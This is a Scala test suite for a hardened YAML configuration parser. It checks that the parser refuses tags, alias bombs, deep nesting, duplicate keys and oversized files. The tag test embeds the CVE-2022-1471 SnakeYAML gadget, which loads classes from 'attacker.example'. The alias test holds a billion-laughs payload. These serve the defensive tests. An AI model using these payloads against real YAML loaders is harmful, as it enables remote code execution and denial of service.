package lakehouse.ingestion.core.config

import io.circe.Json
import lakehouse.ingestion.core.config.SafeYaml.Refusal._
import lakehouse.ingestion.core.config.SafeYaml.{Limits, Position}
import org.scalatest.EitherValues
import org.scalatest.funsuite.AnyFunSuite
import org.scalatest.matchers.should.Matchers

/**
 * What the reader of configuration accepts and what it refuses (ADR-0013 §5). Each refusal is
 * tried with the document that the control exists for.
 *
 * The values expected of the documents that are accepted are those circe-yaml 0.16.1 gave for
 * them, which the reader was compared with before it took its place: the same JSON for every
 * document that both accept.
 */
final class SafeYamlSpec extends AnyFunSuite with Matchers with EitherValues {

  private def obj(fields: (String, Json)*): Json = Json.obj(fields: _*)
  private def str(value: String): Json = Json.fromString(value)

  test("a document becomes the JSON it says: mappings, sequences, numbers, booleans and nulls") {
    val text =
      """# a source, as the discovery has it
        |id: sales.orders
        |enabled: true
        |connector:
        |  type: jdbc
        |  connection: { url: "jdbc:postgresql://postgres:5432/sales", user: ingest_ro }
        |keys: [order_id]
        |quality: { max_rejected_ratio: 0.01 }
        |retries: 3
        |owner: null
        |note:
        |""".stripMargin

    SafeYaml.parse(text).value shouldBe obj(
      "id" -> str("sales.orders"),
      "enabled" -> Json.True,
      "connector" -> obj(
        "type" -> str("jdbc"),
        "connection" -> obj(
          "url" -> str("jdbc:postgresql://postgres:5432/sales"),
          "user" -> str("ingest_ro")
        )
      ),
      "keys" -> Json.arr(str("order_id")),
      "quality" -> obj("max_rejected_ratio" -> Json.fromDoubleOrNull(0.01)),
      "retries" -> Json.fromInt(3),
      "owner" -> Json.Null,
      "note" -> Json.Null
    )
  }

  test("YAML 1.2: yes, no, on and off are strings, and only true and false are booleans") {
    // The JSON schema of YAML 1.2: nothing is a boolean or a null but the words JSON has for
    // them. `True` and `~` are strings, and a decoder that expects a boolean or nothing then
    // says so.
    val text =
      """a: yes
        |b: no
        |c: on
        |d: off
        |e: NO
        |f: y
        |g: true
        |h: false
        |i: True
        |j: ~
        |k: Null
        |""".stripMargin

    SafeYaml.parse(text).value shouldBe obj(
      "a" -> str("yes"),
      "b" -> str("no"),
      "c" -> str("on"),
      "d" -> str("off"),
      "e" -> str("NO"),
      "f" -> str("y"),
      "g" -> Json.True,
      "h" -> Json.False,
      "i" -> str("True"),
      "j" -> str("~"),
      "k" -> str("Null")
    )
  }

  test("a key twice in one mapping is refused, at any depth, with its place") {
    SafeYaml.parse("id: a\nmode: full\nid: b\n").left.value shouldBe
      DuplicateKey("id", Some(Position(3, 1)))

    val nested =
      """load:
        |  watermark: { column: updated_at, column: created_at }
        |""".stripMargin
    SafeYaml.parse(nested).left.value shouldBe DuplicateKey("column", Some(Position(2, 36)))
  }

  test("the same key in two mappings is no duplicate") {
    val text =
      """bronze: { table: bronze/sales/orders }
        |silver: { table: silver/sales/orders }
        |list:
        |  - table: a
        |  - table: b
        |""".stripMargin

    SafeYaml.parse(text).isRight shouldBe true
  }

  test("a tag is refused, whatever it is: the one that built a class in SnakeYAML too") {
    // The document of CVE-2022-1471: with SnakeYAML's default constructor it loaded a class.
    val gadget =
      """!!javax.script.ScriptEngineManager [
        |  !!java.net.URLClassLoader [[ !!java.net.URL ["http://attacker.example/"] ]]
        |]
        |""".stripMargin
    SafeYaml.parse(gadget).left.value shouldBe a[TagNotAllowed]

    SafeYaml.parse("retries: !!str 3\n").left.value shouldBe
      TagNotAllowed("tag:yaml.org,2002:str", Some(Position(1, 10)))
    // circe-yaml makes this the object {"secret": "value"}.
    SafeYaml.parse("password: !secret value\n").left.value shouldBe
      TagNotAllowed("!secret", Some(Position(1, 11)))
    SafeYaml.parse("keys: !!set { a, b }\n").left.value shouldBe a[TagNotAllowed]
  }

  test("more aliases than the limit are refused: the billion laughs") {
    val laughs =
      """a: &a ["lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol"]
        |b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a]
        |c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b]
        |d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c]
        |e: &e [*d, *d, *d, *d, *d, *d, *d, *d, *d]
        |f: &f [*e, *e, *e, *e, *e, *e, *e, *e, *e]
        |g: &g [*f, *f, *f, *f, *f, *f, *f, *f, *f]
        |h: &h [*g, *g, *g, *g, *g, *g, *g, *g, *g]
        |i: &i [*h, *h, *h, *h, *h, *h, *h, *h, *h]
        |""".stripMargin

    // The ninth alias of the second line.
    SafeYaml.parse(laughs).left.value shouldBe
      TooManyAliases(Limits.Default.maxAliases, Some(Position(2, 40)))
  }

  test("a few aliases are read, each as the value it stands for") {
    val text =
      """defaults: &defaults { on_new_column: add, on_type_change: fail }
        |orders: *defaults
        |customers: *defaults
        |""".stripMargin
    val defaults = obj("on_new_column" -> str("add"), "on_type_change" -> str("fail"))

    SafeYaml.parse(text).value shouldBe
      obj("defaults" -> defaults, "orders" -> defaults, "customers" -> defaults)
  }

  test("plain scalars are numbers only as JSON writes them, and strings otherwise") {
    def value(text: String): Json =
      SafeYaml.parse(s"v: $text").value.hcursor.downField("v").focus.get

    Seq("1", "-1", "0", "-0", "1.5", "-0.5", "1e3", "1E3", "1.5e-3", "1.0", "12345678901234567890")
      .foreach { number =>
        withClue(number)(value(number).asNumber.map(_.toString) shouldBe Some(number))
      }
    // An identifier with zeros in front stays what was written, and so does everything else
    // that only looks like a number, a date or a variable.
    Seq("007", "0x1F", "0o17", "1_000", "+1", "2026-11-17", "12:30:00", "${HOME}", ".5", "a b c")
      .foreach { text =>
        withClue(text)(value(text) shouldBe str(text))
      }
    value("\"1\"") shouldBe str("1")
    value("'true'") shouldBe str("true")
    value("\"\"") shouldBe str("")
  }

  test("a number that JSON does not have is refused, not guessed at") {
    Seq("1.", ".inf", "-.inf", ".nan").foreach { text =>
      withClue(text) {
        SafeYaml.parse(s"v: $text").left.value shouldBe NotANumber(text, Some(Position(1, 4)))
      }
    }
    NotANumber("1.", None).message shouldBe
      "'1.' is read as a number that JSON does not have: write it as JSON does, or quote it"
  }

  test("block scalars and quoted scalars are strings, with what YAML does to their lines") {
    val text =
      """literal: |
        |  line one
        |  line two
        |folded: >
        |  folded
        |  text
        |single: 'it''s'
        |double: "tab\tnew\nline"
        |""".stripMargin

    SafeYaml.parse(text).value shouldBe obj(
      "literal" -> str("line one\nline two\n"),
      "folded" -> str("folded text\n"),
      "single" -> str("it's"),
      "double" -> str("tab\tnew\nline")
    )
  }

  test("collections keep their order and their emptiness") {
    SafeYaml.parse("[1, [2, 3], {a: b}, [], {}]").value shouldBe Json.arr(
      Json.fromInt(1),
      Json.arr(Json.fromInt(2), Json.fromInt(3)),
      obj("a" -> str("b")),
      Json.arr(),
      obj()
    )
    SafeYaml.parse("z: 1\na: 2\nm: 3\n").value.asObject.map(_.keys.toList) shouldBe
      Some(List("z", "a", "m"))
    // A key is the text that was written, whatever it would be as a value.
    SafeYaml.parse("1: x\ntrue: y\n~: z\n").value shouldBe
      obj("1" -> str("x"), "true" -> str("y"), "~" -> str("z"))
  }

  test("an alias must have its anchor before it, and nothing may contain itself") {
    SafeYaml.parse("a: *nope\n").left.value shouldBe UnknownAlias("nope", Some(Position(1, 4)))
    // circe-yaml ends in a StackOverflowError on this one: the tree contains itself.
    SafeYaml.parse("a: &a [*a]\n").left.value shouldBe UnknownAlias("a", Some(Position(1, 8)))
    SafeYaml.parse("&m {self: *m}\n").left.value shouldBe a[UnknownAlias]
    // An anchor on a scalar, and one that is given a second value: an alias is the last.
    SafeYaml.parse("a: &x 1\nb: *x\nc: &x 2\nd: *x\n").value shouldBe obj(
      "a" -> Json.fromInt(1),
      "b" -> Json.fromInt(1),
      "c" -> Json.fromInt(2),
      "d" -> Json.fromInt(2)
    )
  }

  test("a merge key is a key like any other: YAML 1.2 has no merge") {
    val text =
      """base: &base { on_new_column: add }
        |orders:
        |  <<: *base
        |  on_type_change: fail
        |""".stripMargin
    val base = obj("on_new_column" -> str("add"))

    // A decoder that knows its fields then refuses `<<` as one it does not know.
    SafeYaml.parse(text).value shouldBe
      obj("base" -> base, "orders" -> obj("<<" -> base, "on_type_change" -> str("fail")))
  }

  test("nesting beyond the limit is refused, and a hundred thousand levels overflow no stack") {
    val limit = Limits.Default.maxDepth
    def nested(depth: Int): String = ("[" * depth) + ("]" * depth)

    SafeYaml.parse(nested(limit)).isRight shouldBe true
    SafeYaml.parse(nested(limit + 1)).left.value shouldBe
      TooDeep(limit, Some(Position(1, limit + 1)))
    // A loader that builds its tree by recursion ends here in a StackOverflowError, which is
    // no error of the document: circe-yaml does.
    SafeYaml.parse(nested(100000)).left.value shouldBe a[TooDeep]
    SafeYaml.parse("- " * 50000 + "x").left.value shouldBe a[TooDeep]
    SafeYaml.parse("{a: " * 50000).left.value shouldBe a[TooDeep]
  }

  test("a document over the size limit is refused before it is read") {
    val limits = Limits(maxCodePoints = 64, maxDepth = 8, maxAliases = 0)
    val text = "key: " + ("x" * 60)

    SafeYaml.parse(text, limits).left.value shouldBe TooLarge(65, 64)
    SafeYaml.parse(text.dropRight(1), limits).isRight shouldBe true
    // Characters, not bytes or UTF-16 units: an emoji is one.
    SafeYaml.parse("k: " + ("😀" * 61), limits).isRight shouldBe true
  }

  test("a file must hold one document: not none, and not two") {
    SafeYaml.parse("").left.value shouldBe NoDocument
    SafeYaml.parse("# only a comment\n").left.value shouldBe NoDocument
    SafeYaml.parse("id: a\n---\nid: b\n---\nid: c\n").left.value shouldBe
      SeveralDocuments(Some(Position(2, 1)))
  }

  test("a key must be a plain value: not a collection, and not an alias") {
    SafeYaml.parse("? [a, b]\n: c\n").left.value shouldBe KeyNotScalar(Some(Position(1, 3)))
    SafeYaml.parse("{ {a: b}: c }\n").left.value shouldBe a[KeyNotScalar]
    SafeYaml.parse("a: &k key\n*k : value\n").left.value shouldBe a[KeyNotScalar]
  }

  test("text that is not YAML is refused with the place of the problem") {
    val refusal = SafeYaml.parse("keys: [order_id, customer_id\nmode: full\n").left.value

    refusal shouldBe a[Malformed]
    refusal.at.map(_.line) shouldBe Some(2)
    refusal.message should include("line 2")
  }

  test("a refusal says what is wrong and where") {
    DuplicateKey("id", Some(Position(3, 1))).message shouldBe
      "the key 'id' appears twice in one mapping (line 3, column 1)"
    SeveralDocuments(Some(Position(2, 1))).message shouldBe
      "the file has more than one document, and must have one (line 2, column 1)"
    TooLarge(65, 64).message shouldBe "the document has 65 characters, and the limit is 64"
  }
}
